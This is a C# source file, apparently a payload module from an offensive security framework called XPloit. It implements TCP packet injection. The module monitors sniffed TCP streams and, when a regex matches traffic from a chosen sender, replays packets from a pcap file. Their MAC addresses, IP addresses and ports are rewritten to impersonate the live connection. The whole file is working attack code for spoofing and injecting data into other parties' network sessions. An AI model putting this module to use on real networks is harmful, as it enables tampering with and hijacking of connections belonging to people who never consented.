using PacketDotNet;
using System.Collections.Concurrent;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using XPloit.Core;
using XPloit.Core.Attributes;
using XPloit.Helpers.Attributes;
using XPloit.Sniffer;
using XPloit.Sniffer.Enums;
using XPloit.Sniffer.Streams;

namespace Payloads.Local.Sniffer
{
    [ModuleInfo(Author = "Fernando Díaz Toledano", Description = "Tcp Packet Injection")]
    public class TcpPacketInjection : Payload, Auxiliary.Local.Sniffer.IPayloadSniffer
    {
        EthernetPacket[] packets = null;

        #region Properties
        [RequireExists]
        [ConfigurableProperty(Description = "File for replication (Ip & Ethernet layer overrided)", Optional = false)]
        public FileInfo SendPcap { get; set; }
        [ConfigurableProperty(Description = "Regex for identification (Payload)", Optional = false)]
        public Regex PayloadRegex { get; set; }
        [ConfigurableProperty(Description = "Regex emisor (Payload)", Optional = false)]
        public ETcpEmisor PayloadRegexEmisor { get; set; }

        public bool CaptureOnTcpStream { get { return true; } }
        public bool CaptureOnPacket { get { return false; } }
        #endregion

        public void Start(object sender) { }
        public void Stop(object sender) { }
        public void OnPacket(object sender, ProtocolType protocolType, EthernetPacket packet) { }
        public void OnTcpStream(object sender, TcpStream stream, bool isNew, ConcurrentQueue<object> queue)
        {
            if (stream == null ||
                stream.LastStream == null ||
                stream.LastStream.Emisor != PayloadRegexEmisor) return;

            if (PayloadRegex.IsMatch(stream.LastStream.DataAscii))
                Inject((NetworkSniffer)sender, stream, packets);
        }
        void Inject(NetworkSniffer sniffer, TcpStream stream, Packet[] packets)
        {
            WriteInfo("Injecting packets");

            foreach (EthernetPacket p in packets)
            {
                // Override ethernet
                p.DestinationHardwareAddress = stream.DestinationHwAddress;
                p.SourceHardwareAddress = stream.SourceHwAddress;
                p.UpdateCalculatedValues();

                var ip = (IPPacket)p.PayloadPacket;
                ip.SourceAddress = stream.Source.Address;
                ip.DestinationAddress = stream.Destination.Address;
                ip.UpdateCalculatedValues();

                if (ip.Protocol != ProtocolType.Tcp) continue;

                TcpPacket tcp = (TcpPacket)ip.PayloadPacket;
                tcp.SourcePort = (ushort)stream.Source.Port;
                tcp.DestinationPort = (ushort)stream.Destination.Port;
                tcp.UpdateCalculatedValues();

                // Send
                sniffer.Send(p);
            }
        }
        public void Dequeue(object sender, object[] obj) { }
        public bool Check()
        {
            packets = NetworkSniffer.ReadAllPacketsFromPcap(SendPcap.FullName).Where(u => u is EthernetPacket).Cast<EthernetPacket>().ToArray();

            if (packets != null && packets.Length > 0)
            {
                WriteInfo("Packets for injection", packets.Length.ToString(), System.ConsoleColor.Cyan);
                return true;
            }

            WriteInfo("Not packet found");
            return false;
        }
    }
}